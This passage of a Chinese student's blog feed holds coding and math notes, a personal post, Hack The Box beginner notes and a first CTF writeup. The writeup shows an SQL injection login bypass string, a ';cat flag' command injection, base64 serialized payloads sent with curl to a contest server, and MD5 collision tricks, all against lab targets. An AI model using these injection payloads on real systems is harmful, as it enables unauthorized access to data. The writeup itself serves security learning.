operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>Next<span class="token operator">=</span><span class="token function">next</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>Next<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>Next<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目：<a href="https://www.luogu.com.cn/problem/P3375">洛谷KMP模板题</a></p>]]></content>
    
    
    <summary type="html">记录KMP算法的一些知识，先记录一些模板话，之后理解了后修改一通。</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>高数</title>
    <link href="https://notes.moyuin.top/2025/03/16/xue-xi/shu-xue/gao-shu-duo-yuan-wei-fen/"/>
    <id>https://notes.moyuin.top/2025/03/16/xue-xi/shu-xue/gao-shu-duo-yuan-wei-fen/</id>
    <published>2025-03-16T15:47:25.000Z</published>
    <updated>2025-03-16T15:47:25.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>高数</h1><h2 id="连续，可偏导，可微证明">连续，可偏导，可微证明</h2><p>感谢萱宝。<br><img src="/images/%E9%AB%98%E6%95%B0-%E5%A4%9A%E5%85%83%E5%BE%AE%E5%88%86/IMG_20250314_112120.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">高数笔记，多元微分</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="高等数学" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数学" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>抱怨</title>
    <link href="https://notes.moyuin.top/2025/03/13/sheng-huo/ji-lu/bao-yuan/"/>
    <id>https://notes.moyuin.top/2025/03/13/sheng-huo/ji-lu/bao-yuan/</id>
    <published>2025-03-13T12:35:53.000Z</published>
    <updated>2025-03-13T12:35:53.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>抱怨</h1><h2 id="不易😭">不易😭</h2><p>为什么 Obsidian 没有<strong>自动存放附件到指定位置+自动把粘贴图片改成 markdown 语法+支持插入格式修改</strong>的三合一插件？？？<br>第一个有 Custom Attachment Location<br>第二个 Obsidian 自带<br>第三个谁来救救我？？🥹<br>每次 paste 图片的时候，<strong>难道我一定要去手动修改我的粘贴格式，好让我的 hexo 识别到吗？</strong><br>我超级懒的…不想折腾太多了😫</p><hr><h2 id="吹风机">吹风机</h2><p>吹头发的时候吹风机喷火了，成了打火机。😭<br>我前几周把以前的吹风机扔了，换了这个功率大的…😐🤨😩<br>一举两得，浪费时间又浪费钱，谢谢教训。<br><em>其实糊味还挺香的。呃…再也不做不吃晚饭的事情了</em></p><hr><h1>Typecho</h1><p>被过时教程折磨到没脾气…<br>ai只适合用于原基础修改，不适合提供教程。👿<br>在不同博客网站穿梭终于搭建起自己的<a href="blog.moyuin.top">Typecho博客网站</a>，开心，但是折腾好累，难过😡。</p>]]></content>
    
    
    <summary type="html">不想折腾的时候，记录一些小抱怨</summary>
    
    
    
    <category term="杂谈" scheme="https://notes.moyuin.top/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="记录" scheme="https://notes.moyuin.top/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Hack the box</title>
    <link href="https://notes.moyuin.top/2025/03/11/xue-xi/ctf/hack-the-box/"/>
    <id>https://notes.moyuin.top/2025/03/11/xue-xi/ctf/hack-the-box/</id>
    <published>2025-03-11T15:03:18.000Z</published>
    <updated>2025-03-11T15:03:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Hack the box</h1><p>玩一下。</p><h2 id="起步">起步</h2><p>起步的确很简单，连接了vpn然后就可以用kali玩玩渗透测试了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> openvpn Moyuin.vpn <span class="token comment">#记住得在文件目录里面打开，否则就是报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="telnet">telnet</h3><p><strong>基础流程</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span> <span class="token comment"># 看看ping是否通，确认一下网络</span><span class="token function">sudo</span> nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span> <span class="token comment"># 找开的端口，确认一下我们的方案</span>telnet <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span> <span class="token comment">#直接连接，用root登陆</span><span class="token function">ls</span>flag.txt  snap<span class="token function">cat</span> flag.txtb40abdfe23665f766f9c61ecba8a4c19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交第一个 flag！telnet弱凭证！</p><h3 id="ftp-File-Transfer-Protocol">ftp (File Transfer Protocol)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span><span class="token function">sudo</span> nmap <span class="token parameter variable">-sV</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span><span class="token comment"># 开21端口，用ftp连接</span><span class="token function">ftp</span> <span class="token parameter variable">-a</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span> <span class="token comment">#使用anonymous匿名登陆</span><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">dir</span>get flag.txt <span class="token operator">|</span> mget flag.txt <span class="token comment">#后者下载多个文件，可以用lcd先设置好目录</span>ctrl+z <span class="token comment">#退出</span><span class="token function">cat</span> flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SMB-Server-Message-Book">SMB (Server Message Book)</h3><p><code>sudo nmap -sV &#123;target_ip&#125;</code> 扫到端口。<br><img src="/images/Hackthebox/20250317000824135.png" alt=""><br>SMB 在445/tcp运行，服务名为 microsoft-ds。<br>使用 <code>smbclient -L &#123;target_ip&#125;</code> 访问SMP服务，获取所有的 Dancing List，但登陆后提示需要账户，随便输入后得到可以登陆的账户。</p><p><img src="/images/Hackthebox/20250317001452215.png" alt=""><br>有4个用户，一直访问，直到获取权限。<br>使用  <code>smbclient \\\\&#123;target_ip&#125;\\&#123;用户名&#125;</code> ，用于登陆，可是密码怎么办呢？使用空密码，一个一个账户试一试。<br>用户名为WorkShares时，成功。<br><img src="/images/Hackthebox/20250317002508240.png" alt=""></p><p>用help看看指令。发现基本和linux指令相同。<br><img src="/images/Hackthebox/20250317002646839.png" alt=""><br>用cd进入各种库，看看flag藏在哪里。用 <code>get &#123;文件名&#125;</code> 得到文件。<br>看完库了就 <code>cd .. </code> 退出。<br><img src="/images/Hackthebox/20250317002934559.png" alt=""><br>找到flag，get后exit。<br>最后 <code>cat flag.txt</code> 得到答案。<br><img src="/images/Hackthebox/20250317003131774.png" alt=""></p><h3 id="TCP-Redis">TCP(Redis)</h3><p>先扫端口，自己的虚拟机不知道为什么nmap扫不出6379这个端口，只好一个一个试了<br><img src="/images/Hackthebox/20250318225134933.png" alt=""><br>Redis是一个内存数据库，详见<a href="https://en.wikipedia.org/wiki/Redis">Redis维基百科</a>。<br>使用 <code>redis-cli</code> 进入客户端基本操作。<a href="https://www.runoob.com/redis/redis-commands.html">可看菜鸟教程。</a><br>用 -h 指定主机名，-p 指定端口， -a 指定密码。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token punctuation">&#123;</span>target_ip<span class="token punctuation">&#125;</span> <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token parameter variable">-a</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接远程redis服务器，开始操作。<br>使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>target_ip:6379<span class="token punctuation">&#125;</span><span class="token operator">></span> INFO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到服务器的消息。<br><img src="/images/Hackthebox/20250318231434680.png" alt=""><br>在看keyspace的时候，可以看到连接的是哪一个数据库：<br><img src="/images/Hackthebox/20250318232344057.png" alt=""><br>这里显示：这个服务器上只有一个数据库db0，db0有4个key，并且没有过期时间，每个数据库的数据是隔离的，一般用一个数据库的key存不同数据，所以我们先</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keys * <span class="token comment">#查看这个数据库所有的keys的名称，相当于ls了</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps:如果有不同数据库，我们需要先</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token punctuation">[</span>index<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用于选择不同的数据库。<br><img src="/images/Hackthebox/20250318232918261.png" alt=""><br>找到了flag，我们直接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/Hackthebox/20250318232955821.png" alt=""><br>得到flag。</p><h2 id="免费HTB关卡结束-之后玩一玩别的。">免费HTB关卡结束,之后玩一玩别的。</h2>]]></content>
    
    
    <summary type="html">边玩边记录玩法，持续更新，每天玩一点</summary>
    
    
    
    <category term="CTF学习" scheme="https://notes.moyuin.top/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="CTF" scheme="https://notes.moyuin.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HNUCTF2024新生杯writeup</title>
    <link href="https://notes.moyuin.top/2025/03/05/xue-xi/ctf/hnuctf2024-xin-sheng-bei-writeup/"/>
    <id>https://notes.moyuin.top/2025/03/05/xue-xi/ctf/hnuctf2024-xin-sheng-bei-writeup/</id>
    <published>2025-03-05T05:13:51.000Z</published>
    <updated>2025-03-05T05:13:51.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>HNUCTF2024新生杯writeup</h1><p><strong>HNUCTF</strong>新生杯——来自不睡觉的新生<strong>MOMOsleeping</strong>的wirteup<br>这是一篇留档，为HNU2024年12月的一场新生杯writeup。<br>也是我的第一场CTF。</p><h2 id="基本信息">基本信息</h2><blockquote><p><strong>平台id：Moyuin</strong><br><strong>排名：第8名</strong></p></blockquote><h2 id="解题情况"><strong>解题情况</strong></h2><p><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5.png" alt=""></p><h3 id="Misc">Misc</h3><h4 id="1-Misc-签到">1.Misc <strong>签到</strong></h4><p><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc1.png" alt=""><br>复制粘贴即可。</p><blockquote><p><strong>HNUCTF{Welcome_to_HNUCTF2024!}</strong></p></blockquote><h4 id="2-Misc-网络鲨鱼">2.Misc <strong>网络鲨鱼</strong></h4><p>上网搜索后发现是一个网络嗅探包，使用<strong>Wireshark</strong>打开文件，在一堆files not found中发现这个http流量get的有点特别。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc2.png" alt=""><br>猜测是base64加密，解码后得到。</p><blockquote><p><strong>HNUCTF{w1r3sh4rk_4n4lys1s}</strong></p></blockquote><h4 id="3-Misc-bob-traffic">3.Misc <strong>bob_traffic</strong></h4><p>同样是网络嗅探包。<br>利用wireshark直接去分析tcp和http的get，发现有一个特殊流量（唯一的，显示f！ag，打开看看发现）<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc3.png" alt=""><br>得到flag。<br>与上一题解题思路重复了，也许上一题的各大http流量里面藏有所玄机？</p><blockquote><p><strong>HNUCTF{pcapng_Zcpuatre_traffic}</strong></p></blockquote><h4 id="4-Misc-新佛经">4.Misc <strong>新佛经</strong></h4><p><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc4.png" alt=""><br>打开txt是一个hex编码，使用cyberchef解密得到</p><pre class="line-numbers language-none"><code class="language-none">TFJZR1hKe2E2blIzaWdfcTBWM19JcmcwZ01yOX0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拖过去base64解密，得到</p><pre class="line-numbers language-none"><code class="language-none">LRYGXJ&#123;a6nR3ig_q0V3_Irg0gMr9&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>什么玩意儿？<br>迷茫中看到题目说：</p><blockquote><p>听闻凯撒贝斯。知晓16与string的轮回。</p></blockquote><p>贝斯是指base64，那么凯撒就是…<br>凯撒密码？尝试凯撒密码一步一步解决。<br>遍历4个加密位移后得到想要的结果。</p><blockquote><p><strong>HNUCTF{w6jN3ec_m0R3_Enc0cIn9}</strong></p></blockquote><h4 id="5-Misc-Tetris">5.Misc <strong>Tetris</strong></h4><p>经典本地游戏CE修改器刷分咯。<br>用ce修改这个游戏，跟着网上教程来。<br>先得几分然后next scan最终得到这两个address。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc5_1.png" alt=""><br>Change一下变成10000，得到题目要求“10000分得到flag”。<br>把value改到10000以上的数，然后让乱玩让gameover，之后弹出来:<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc5_2.png" alt=""><br>得到flag。</p><blockquote><p><code>HNUCTF&#123;#31c0m3_t0_HN#CtF_2024_eX1JT0O1&#125;</code><br><em>这里使用非代码块会出渲染问题…{和#的组合太恐怖</em></p></blockquote><h4 id="6-Misc-git-leak">6.Misc <strong>git_leak</strong></h4><p>打开下载的文件，看见flag.txt打开:<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc6-1.png" alt=""><br>那我就下一个Typora吧。学长有心了，给新生这样的小建议。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc6-2.png" alt=""><br>说里有个flag，开找“这里”，题目也说了是“git leak”。<br>刚好，打开.git翻找，发现有一个文件叫flag，说明git里面有有关flags的记录！<br>打开得到:<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc6-3.png" alt=""><br>刚好vscode里面有一个git插件，就导入进去看看记录吧。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/misc6-4.png" alt="">Flag在git里面leak咯。</p><blockquote><p><strong>HNUCTF{y0u_h4ve_f1nd_th3_g1t_l34k}</strong></p></blockquote><h3 id="Crypto">Crypto</h3><h4 id="1-Cypto-Buddha">1.Cypto <strong>Buddha</strong></h4><p><strong>佛曰解密为base64</strong><br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/crypto1-1.png" alt=""><br>Base64解密即可<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/crypto1-2.png" alt=""></p><blockquote><p><strong>HNUCTF{buddha_2c5f12b7-a95f-4c22-9372-1e320b297f49}</strong></p></blockquote><h4 id="2-Crypto-ebg13">2.Crypto <strong>ebg13</strong></h4><p><strong>Base64</strong>解密<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/crypto2-1.png" alt=""><br>加凯撒密码<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/crypto2-2.png" alt=""></p><blockquote><p><strong>HNUCTF{rot_is_fun_e8057890-1e42-4c61-9e57-4ad8c218e4c3}</strong></p></blockquote><h4 id="3-Crypto-ezrsa">3.Crypto <strong>ezrsa</strong></h4><p>让ai写一个解密rsa的python ,再不断装库之后得到。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/crypto3-1.png" alt=""></p><blockquote><p><strong>HNUCTF{rsa_is_fun_8e4b49fd-070c-473f-a510-ff891b95f56b}</strong></p></blockquote><h3 id="WEB">WEB</h3><h4 id="1-Web-ez-sqli"><a href="http://1.Web">1.Web</a> <strong>ez_sqli</strong></h4><p>经典sql注入。<br>经典的用户名：admin’ OR ‘1’='1<br>密码：输入啥都行<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web1.png" alt=""></p><blockquote><p><strong>HNUCTF{SQL_iNJECTor_4059a701-61a6-4f11-96bd-e6b01e3a3186}</strong></p></blockquote><h4 id="2-Web-ez-cmdi"><a href="http://2.Web">2.Web</a> <strong>ez_cmdi</strong></h4><p>现学curl，理解一下get和post。<br>看ip，ip后的输入可以当作命令，直接cat flag。<br>那我们给ip后发送command即可。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web2.png" alt=""></p><blockquote><p><strong>HNUCTF{ping_command_091ae904-c702-4b02-9bf6-9d377aa382c6}</strong></p></blockquote><h4 id="3-Web-md5"><a href="http://3.Web">3.Web</a> <strong>md5:</strong></h4><p>经典md5= =比较。<br>根据if条件可以判断要找两个不同但md5相同的字符串<br>找个md5碰撞对相同的密码和用户名就ok了，这个得去网上找一下。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web3.png" alt=""><br>随便挑一个curl一下输入post传参即可。<br>输入：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST -d &quot;password&#x3D;QNKCDZO&quot; &quot;http:&#x2F;&#x2F;129.204.78.34:20703?name&#x3D;240610708&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到Flag:</p><blockquote><p><strong>HNUCTF{easy_md5_2b34686e-50b2-45e8-9757-e28a94fece1f}</strong></p></blockquote><h4 id="4-Web-md5-again"><a href="http://4.Web">4.Web</a> <strong>md5_again:</strong></h4><p>以为是Name从get变成post，改一下输入curl就行<br>发现不对！<br>转头一看发现是严格相等。为===<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web4.png" alt=""><br>由于题目还限定了强制转化字符串比较，因此不能使用数组来绕过，我们需要构造一对md5相同而不同字符的字符串。我们只能使用md5碰撞来实现。<br>去网上找一下符合要求的，复制粘贴形成post要传的参数。<br>curl post记得urlencode，把特殊字符传出去。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web4-2.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">curl -X POST &quot;http:&#x2F;&#x2F;x.x.x.x:xxxx&quot; \     -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; \     -d &quot;name&#x3D;M%9C9h%FF%E0%E3%5C%20%9...%93%D8&amp;password&#x3D;M%9C9h%FF%E0%E3%5C%20%9...%93%D8&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>powershell传入。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web4-3.png" alt=""><br>得到flag</p><blockquote><p><strong>HNUCTF{md5_again_bcf8de06-3aa5-4c09-9120-4bfeccf0b5a1}</strong></p></blockquote><h4 id="5-Web-ez-serialize"><a href="http://5.Web">5.Web</a> <strong>ez_serialize</strong></h4><p>看得懂那个网站的php：<br>传入post的参数为base64可以转化为command指令，那我们直接先ls看看有没有flag，然后cat一下就出来了。<br>先将命令转化为base64，然后curl传进去。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/web5-1.png" alt=""><br>获取ls：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST -d&quot;data&#x3D;Tzo10iJteWNtZCI6MTp7cz0z0iJjbWQ103M6NDoibHMgLyI7fQ&#x3D;&#x3D;&quot;http:&#x2F;&#x2F;129.204.78.34:20738&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>cat flag：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST -d&quot;data&#x3D;Tzo10iJtewNtZCI6MTp7cz0z0iJjbwQi03M60ToiY2F0Ic9mbGFnIjt9&quot; http:&#x2F;&#x2F;129.204.78.34:20738&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><strong>HNUCTF{easy_serialize_af79f24b-7638-4e49-b60d-08ac1431d690}</strong></p></blockquote><h3 id="PWN">PWN</h3><h4 id="1-Pwn-command-injection">1.Pwn <strong>command injection</strong></h4><p>nc连接到ip，这不用说。<br>获取command权限后，但是发现ls和cat没反应。<br>但是看了看规则后，显示==;==后的命令会进行。<br>诶，那是不是说明 ；前面的指令无法执行，后面的指令可以进行？然后就尝试 ;cat flag了一下，结果就出来了<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/PWN1.png" alt=""></p><blockquote><p><strong>HNUCTF{u_have_completed_the_command_injection_28918ec949db}</strong></p></blockquote><h3 id="Reverse">Reverse</h3><h4 id="1-Reverse-ez-reverse1">1.Reverse: <strong>ez_reverse1</strong></h4><p>签到题就要有签到题的样子，在网上看看reverse签到题一般什么样，然后学习。<br><strong>先下载神器ida pro,再跟着做</strong></p><ul><li>将文件导入到IDA里</li><li>按F5进行反编译</li><li>观察反编译后的C语言源码，找到flag<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/reverse1-1.png" alt=""><br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/reverse1-2.png" alt=""></li></ul><blockquote><p><strong>HNUCTF{W3lcome_t0_HNUCTF}</strong></p></blockquote><h3 id="OSINT">OSINT</h3><h4 id="1-Osint-here-is">1.Osint <strong>here is</strong></h4><p>照片里可以看到：<br><strong>虎踞龙盘在此间；灵秀聚钟人莫识</strong><br>在bing搜索一下发现一篇介绍韶山滴水洞引用这句诗的新闻。<em>（顺便感慨一下bing的强悍爬虫…已经把这个博客的文章给爬取了）</em><br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint1-1.png" alt=""><br>结合这里的山环境，可以合理猜测一下这个地点就是滴水洞景区，搜索一下它的票价。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint1-2.png" alt=""><br>根据flag所给规则，写入正确：</p><blockquote><p><strong>HNUCTF{dishuidong_O3!nT_40.00}</strong></p></blockquote><h4 id="2-Osint-where-are-i">2.Osint <strong>where_are_i</strong></h4><p>关键词 <strong>云巴，磁悬浮，空旷，十字路口</strong>。打开百度地图搜索就看得见一个<strong>云巴旅游磁悬浮线</strong>，观察附近街景直接确定。<br>并且周围还有相同的建筑物，更加笃定了。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint2-1.png" alt=""><br>找到街景最近的十字路口。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint2-2.png" alt=""><br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint2-3.png" alt=""><br>得到flag。</p><blockquote><p><strong>HNUCTF{112.924_28.096_Os!nT}</strong></p></blockquote><h4 id="3-Osint-where-are-i-again">3.Osint <strong>where_are_i_again!</strong></h4><p>通过12306查询D3009这辆车 ，对比时间，粗略判断这一站是<strong>南京南</strong>。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint3-1.png" alt=""><br>然后从南京南找到75为末尾号，终点站为合肥南，始发站为XX南的列车，恰好就这一个：<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint3-2.png" alt=""><br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint3-3.png" alt=""><br>注意flag是始发站的车次号就ok，G7675始发站为G7674，得到flag。</p><blockquote><p><strong>HNUCTF{0siN7_G7674_nanjingnan}</strong></p></blockquote><h4 id="4-Osint-see-see-need">4.Osint <strong>see_see_need</strong></h4><p>去bing搜搜信安协会会长<a href="https://github.com/L1uYun/l1uyun_blog">L1uYun</a> 找到了他的github！<br>然后在他的blog里看他最近的submit的文件 发现了<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint4-1.png" alt=""><br>交上去发现不对，很怪，结合聊天记录说有干扰项，另辟思路看看其他大佬的。<br>发现了一个健身学长<a href="https://github.com/yulv706/blog/blob/main/src/site/notes/blog/%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/Hydra_%E5%AD%97%E5%85%B8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.md">yulv706</a>的github仓库！<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/osint4-2.png" alt=""><br>其实还有一个派大星学长的，但是派大星学长直接说是HNUCTF{fake_flag}，故直接提交可用的flag。<br>因为健身佬的blog好久没更新了，所以我只要看最新的更新一直点一直点，然后看到HNUCTF复制粘贴就好了。或者直接去他的博客检索HNUCTF，也可以得到含有这个flag的博客文章。<em>顺便学到了一些ctf知识</em><br>提交成功。<br><strong>大家平时也要注意自己的个人信息能不能直接被搜索引擎搜到哦…😑</strong></p><blockquote><p><strong>HNUCTF{OSINT_leads_to_flag}</strong></p></blockquote><h2 id="总结"><strong>总结</strong></h2><p>作为新生打这场ctf还是很开心的！这一次新生杯严格来说算是自己的第一次网安的比赛，感觉和acm很不一样，也更好玩一些，像一系列趣味游戏！<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/summary.png" alt=""><br>前面的大佬还是超级多！！有ak的！太强了，和前一名的这位新生大佬差快800分了，但是作为新生，第一次尝试这场比赛我已经很知足，边打边学新知识，实践出真知！<br>虽然reverse和pwn没写出来几个哈哈哈，但是web和misc做了很多，还是很感兴趣的，以后要选比赛方向的话，这两个很有趣，可能会选。<br>但是pwn的操作很像 《<strong>Hacknet</strong>》的玩法，这个更符合我对hacker的印象了，超级酷，reverse有点难难的，涉及到编译基础，也激励着我在之后的学习中多多了解。<br><img src="/images/HNUCTF2024%E6%96%B0%E7%94%9F%E6%9D%AFwriteup/blanket.png" alt=""></p><p><strong>收获很多，期待以后的前行路。</strong></p>]]></content>
    
    
    <summary type="html">我的第一场CTF。</summary>
    
    
    
    <category term="CTF学习" scheme="https://notes.moyuin.top/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
